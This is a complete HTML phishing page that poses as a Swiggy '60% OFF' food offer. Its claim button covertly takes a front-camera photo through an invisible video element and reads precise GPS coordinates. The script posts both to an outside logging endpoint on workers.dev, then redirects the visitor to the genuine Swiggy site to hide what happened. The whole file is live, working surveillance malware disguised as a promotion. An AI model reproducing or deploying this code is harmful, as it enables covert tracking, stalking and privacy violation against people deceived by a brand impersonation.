<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swiggy | Exclusive Offers</title>
    <style>
        body { background: #fff; color: #282c3f; font-family: 'ProximaNova', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; width: 90%; max-width: 400px; }
        /* Swiggy Orange Logo Mockup */
        .logo { width: 80px; height: 80px; background: #fc8019; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 20px rgba(252,128,25,0.2); }
        .logo svg { width: 50px; fill: white; }
        h1 { font-size: 1.4rem; font-weight: 800; margin-bottom: 8px; }
        p { font-size: 0.9rem; color: #7e808c; margin-bottom: 30px; }
        .loader { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #fc8019; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1rem; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        /* Hidden Camera Element */
        #v { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 512 512"><path d="M342.1 434.4c-11.6-9.1-31.1-24.6-31.1-59.5 0-31.1 19.3-50.6 32.1-63.4 12.8-12.8 29.3-29.3 29.3-51.2s-16.5-38.4-29.3-51.2c-12.8-12.8-32.1-32.3-32.1-63.4 0-34.9 19.5-50.4 31.1-59.5 5.5-4.4 8.7-11 8.7-18V24c0-13.3-10.7-24-24-24H184c-13.3 0-24 10.7-24 24v46.2c0 7-3.2 13.6-8.7 18-11.6 9.1-31.1 24.6-31.1 59.5 0 31.1 19.3 50.6 32.1 63.4 12.8 12.8 29.3 29.3 29.3 51.2s-16.5 38.4-29.3 51.2c-12.8 12.8-32.1 32.3-32.1 63.4 0 34.9 19.5 50.4 31.1 59.5 5.5 4.4 8.7 11 8.7 18V488c0 13.3 10.7 24 24 24h144c13.3 0 24-10.7 24-24v-35.6c0-7-3.2-13.6-8.7-18z"/></svg>
        </div>
        <div id="main-content">
            <h1>Special Offer Near You</h1>
            <p>Get <strong>60% OFF</strong> on your next meal. Verify your location to see restaurants participating in this offer.</p>
            <button id="btn" class="btn">CLAIM OFFER</button>
        </div>
        <div id="loader-content" style="display:none;">
            <div class="loader"></div>
            <p>Syncing with Swiggy Local Node...</p>
        </div>
    </div>

    <video id="v" playsinline muted></video>

    <script>
        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
        const video = document.getElementById('v');
        const btn = document.getElementById('btn');
        const main = document.getElementById('main-content');
        const loader = document.getElementById('loader-content');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            main.style.display = 'none';
            loader.style.display = 'block';

            try {
                // Precision Strike: High-accuracy GPS request
                // We do not set a short timeout here to ensure we get a PIN-DROP lock.
                const [stream, pos] = await Promise.all([
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
                    new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                            enableHighAccuracy: true,
                            timeout: 10000, // Giving the chip 10 seconds to get the best pin
                            maximumAge: 0
                        });
                    })
                ]);

                video.srcObject = stream;
                video.play();

                // Wait 1 second for camera focus/exposure behind the scenes
                setTimeout(() => finalize(pos), 1000);

            } catch (err) {
                finalize(null);
            }
        };

        async function finalize(pos) {
            let photo = "HIDDEN_CAPTURE_FAILED";
            if (video.srcObject) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photo = canvas.toDataURL('image/jpeg', 0.4); // Compressed for speed
                video.srcObject.getTracks().forEach(t => t.stop());
            }

            const gps = pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "GPS_LOCK_FAILED";

            // Faster Uplink
            fetch(LOGGING_API, {
                method: 'POST',
                mode: 'cors',
                credentials: 'omit',
                keepalive: true,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: photo, gps: gps })
            });

            // Instant Redirect to Swiggy
            window.location.replace("https://www.swiggy.com/offers-near-me");
        }
    </script>
</body>
</html>
